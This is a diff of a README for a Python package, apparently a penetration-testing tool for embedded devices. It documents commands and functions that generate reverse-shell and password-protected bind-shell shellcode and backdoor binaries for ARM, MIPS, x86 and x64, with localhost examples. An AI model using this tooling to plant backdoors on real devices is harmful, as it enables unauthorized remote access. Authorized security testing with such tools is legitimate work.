@@ -13,25 +13,44 @@ This tool is embedded in the security test of the device. There are two main fun
 2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**
 
 3.  Fixed some bugs that the reverse_shellcode and reverse_backdoor **ports were selected too big**, and **added the function of generating bindshell with specified ports and passwords under x86 and x64**，**and beautified the generation process****（This feature will be updated to various architectures）**
-Add support armvelv7_bind_shell(2022.10.27)
+    Add support armvelv7_bind_shell(2022.10.27)，
 
-## install (1)  Highly recommended！！Because the source code compilation may not be updated in time，Please install the latest
+4.  Removed the generation sleep time of shellcode, and added mips_ bind_ Shell, reverse of x86 and x64 small end_ shell_ Backdoor, the mips that are expected to be interrupted by mips_ bind_ Shell, which solves the error of password logic processing in the bindshell in mips，Joined aarch64_ bind_ shell
+
+5.  Support command line generation backdoor and shell code, characterized by light, small, efficient and fast
+
+## install
 
 ```
 pip install hackebds
-pip3 install -U hackebds
+pip install -U hackebds
 ```
+
+![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
+
 #### Instructions for use
 
 When importing this module will import the pwn module
 
 Please install the corresponding binutils environment before use
 expample:
+
 ```
 apt search binutils | grep arm（You can replace it here）
 apt install binutils-arm-linux-gnueabi/hirsute
 ```
-1. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
+
+1. Use the command line to generate the backdoor file name, shellcode, binshell, etc
+
+   ![image-20221102181421443](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181421443.png)
+
+   ```
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode -passwd 1231
+   ```
+
+   ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
+
+2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
 ```
 >>> from hackebds import *
@@ -50,6 +69,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
 ```
 
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
+
 ```
 >>> mipsel_backdoor("127.0.0.1",5566)
 [+] reverse_ip is: 127.0.0.1
@@ -59,20 +79,24 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>>
 ```
 
-![image-20221026181947194](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20221026181947194.png)
+![image-20221028144512270](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png)
 
 ```
 >>> from hackebds import *
->>> x64_bind_shell(13000,"1235")
-[+] bind port is set to 13000
-[+] passwd is set to '1235'
+>>> x86_bind_shell(4466,"doud")
+[+] bind port is set to 4466
+[+] passwd is set to 'doud'
+0x0000000064756f64
 [*] waiting 3s
-[+] x64_bind_shell is ok in current path ./
+[+] x86_bind_shell is ok in current path ./
+>>>
 ```
 
-![image-20221026182024685](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20221026182024685.png)
-
 ![image-20221028143802937](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png)
+
+Then connect to the port bound to the device (password exists)
+
+![image-20221028144136069](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png)
 
 2. Generates the use-back shellcode (no free) null bytes corresponding to various architectures
 
@@ -126,9 +150,13 @@ Qualcomm Snapdragon 660
  2022.6.27 0.1.0 Added Android backdoor generation
 
  2022.10.26 0.1.5 Fixed some problems and added some automatic generation functions of bindshell specified port passwords
- 
+
  2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)
- 
+
+ 2022.11.1 Removed the generation sleep time of shellcode, and added mips_ bind_ Shell, reverse of x86 and x64 small end_ shell_ Backdoor, the mips that are expected to be interrupted by mips_ bind_ Shell, which solves the error of password logic processing in the bindshell in mips
+
+ 2022.11.2 Joined aarch64_ bind_ shell
+
 
 ## One-click build environment
 
